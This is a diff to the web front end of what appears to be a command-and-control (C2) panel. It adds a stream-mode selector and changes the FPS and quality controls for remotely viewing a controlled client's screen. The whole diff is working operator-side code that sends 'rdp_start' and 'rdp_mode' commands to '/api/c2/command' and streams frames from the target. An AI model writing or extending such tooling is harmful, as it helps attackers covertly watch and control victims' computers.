@@ -559,22 +559,31 @@
 
                 <!-- Controls -->
                 <div class="panel-card" style="margin-bottom:16px;">
-                    <div style="display:flex;align-items:center;gap:24px;flex-wrap:wrap;">
+                    <div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap;">
                         <button class="btn btn-primary" id="rdp-toggle-btn">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
                             Start Stream
                         </button>
 
                         <div style="display:flex;align-items:center;gap:8px;">
-                            <label style="font-size:12px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">FPS</label>
-                            <input type="range" class="slider-range" id="rdp-fps" min="1" max="30" value="10" style="width:120px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Mode</label>
+                            <select id="rdp-mode" style="background:rgba(255,255,255,0.05);border:1px solid var(--border-color);color:var(--text-primary);padding:6px 12px;border-radius:8px;font-size:12px;outline:none;cursor:pointer;">
+                                <option value="1" style="background:#151518;color:#fff;">Tile Delta (Fast Stream)</option>
+                                <option value="2" style="background:#151518;color:#fff;">High Quality Text (WebRTC Quality)</option>
+                                <option value="0" style="background:#151518;color:#fff;">Standard</option>
+                            </select>
+                        </div>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">FPS</label>
+                            <input type="range" class="slider-range" id="rdp-fps" min="1" max="30" value="10" style="width:100px;">
                             <span id="rdp-fps-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:24px;">10</span>
                         </div>
 
                         <div style="display:flex;align-items:center;gap:8px;">
-                            <label style="font-size:12px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Quality</label>
-                            <input type="range" class="slider-range" id="rdp-quality" min="10" max="100" value="50" step="5" style="width:120px;">
-                            <span id="rdp-quality-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:36px;">50%</span>
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Quality</label>
+                            <input type="range" class="slider-range" id="rdp-quality" min="10" max="100" value="60" step="5" style="width:100px;">
+                            <span id="rdp-quality-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:36px;">60%</span>
                         </div>
 
                         <span id="rdp-status" style="font-size:12px;color:var(--text-muted);margin-left:auto;">Stopped</span>
@@ -863,6 +872,7 @@
 
         // Remote Desktop controls
         const rdpToggleBtn = document.getElementById('rdp-toggle-btn');
+        const rdpModeSelect = document.getElementById('rdp-mode');
         const rdpFpsSlider = document.getElementById('rdp-fps');
         const rdpFpsVal = document.getElementById('rdp-fps-val');
         const rdpQualitySlider = document.getElementById('rdp-quality');
@@ -880,15 +890,29 @@
             rdpQualityVal.textContent = rdpQualitySlider.value + '%';
         });
 
-        rdpToggleBtn.addEventListener('click', async () => {
-            if (!rdpRunning) {
-                const fps = rdpFpsSlider.value;
-                const quality = rdpQualitySlider.value;
+        rdpModeSelect.addEventListener('change', async () => {
+            if (rdpRunning) {
+                const mode = rdpModeSelect.value;
                 try {
                     await fetch('/api/c2/command', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ client_id: clientId, command: 'rdp_start:' + fps + ':' + quality })
+                        body: JSON.stringify({ client_id: clientId, command: 'rdp_mode:' + mode })
+                    });
+                } catch (e) { console.error(e); }
+            }
+        });
+
+        rdpToggleBtn.addEventListener('click', async () => {
+            if (!rdpRunning) {
+                const fps = rdpFpsSlider.value;
+                const quality = rdpQualitySlider.value;
+                const mode = rdpModeSelect.value;
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'rdp_start:' + fps + ':' + quality + ':' + mode })
                     });
                     rdpRunning = true;
                     rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="6" width="12" height="12" rx="2"/></svg> Stop';
@@ -897,6 +921,7 @@
                     rdpStatus.textContent = 'Connecting...';
                     rdpStatus.style.color = 'var(--warning, #f59e0b)';
 
+                    if (rdpStream) rdpStream.close();
                     rdpStream = new EventSource('/api/c2/stream/' + encodeURIComponent(clientId));
                     rdpStream.onmessage = (e) => {
                         if (e.data) {
@@ -908,8 +933,8 @@
                         }
                     };
                     rdpStream.onerror = () => {
-                        rdpStatus.textContent = 'Connection lost';
-                        rdpStatus.style.color = 'var(--danger, #ef4444)';
+                        rdpStatus.textContent = 'Connecting...';
+                        rdpStatus.style.color = 'var(--warning, #f59e0b)';
                     };
                 } catch {
                     rdpStatus.textContent = 'Failed to start';
@@ -925,7 +950,7 @@
                 } catch {}
                 if (rdpStream) { rdpStream.close(); rdpStream = null; }
                 rdpRunning = false;
-                rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start';
+                rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Stream';
                 rdpToggleBtn.classList.remove('btn-danger');
                 rdpToggleBtn.classList.add('btn-primary');
                 rdpFrame.style.display = 'none';
